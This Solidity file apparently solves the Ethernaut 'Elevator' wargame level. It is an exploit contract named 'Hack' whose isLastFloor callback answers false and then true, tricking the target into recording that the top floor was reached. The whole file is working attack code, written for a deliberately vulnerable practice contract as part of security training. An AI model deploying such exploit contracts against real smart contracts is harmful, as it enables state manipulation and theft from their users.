// SPDX-License-Identifier: MIT

pragma solidity ^0.8;

interface IElevator {
    function goTo(uint256) external;
    function top() external view returns (bool);
}

contract Hack {
    IElevator private immutable elevatorContract;
    uint256 counter;

    constructor(address elevatorContractAddress) {
        elevatorContract = IElevator(elevatorContractAddress);
    }

    function pwn() external {
        elevatorContract.goTo(1);
        require(elevatorContract.top(), "Current floor is not the top floor.");
    }

    function isLastFloor(uint256) external returns (bool) {
        counter++;
        return counter > 1;
    }
}